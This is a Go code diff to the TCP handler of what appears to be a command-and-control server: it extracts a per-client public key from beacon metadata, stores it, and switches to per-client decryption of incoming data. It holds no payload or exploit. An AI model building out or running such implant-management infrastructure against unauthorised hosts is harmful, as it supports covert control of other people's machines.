@@ -11,6 +11,7 @@ import (
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
 	"bufio"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"io"
@@ -313,7 +314,7 @@ func HandleTcpConnection(conn net.Conn) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err, "from:", conn.RemoteAddr())
 				break
@@ -350,7 +351,8 @@ func HandleTcpConnection(conn net.Conn) {
 					logger.Error("Metainfo too short for parsing:", conn.RemoteAddr())
 					break
 				}
-
+				publicKey := metainfo[:32]
+				metainfo = metainfo[32:]
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4])
 
@@ -422,6 +424,7 @@ func HandleTcpConnection(conn net.Conn) {
 					Sleep:      "0",
 					Online:     "1",
 					Color:      "",
+					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
 				}
 
 				// 插入数据库
@@ -485,7 +488,7 @@ func HandleTcpConnection(conn net.Conn) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
 				break
@@ -505,13 +508,13 @@ func HandleTcpConnection(conn net.Conn) {
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("First decrypt failed:", err)
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("Second decrypt failed:", err)
 				break
@@ -727,7 +730,7 @@ WHERE uid = ? AND file_path = ?;
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
 				break
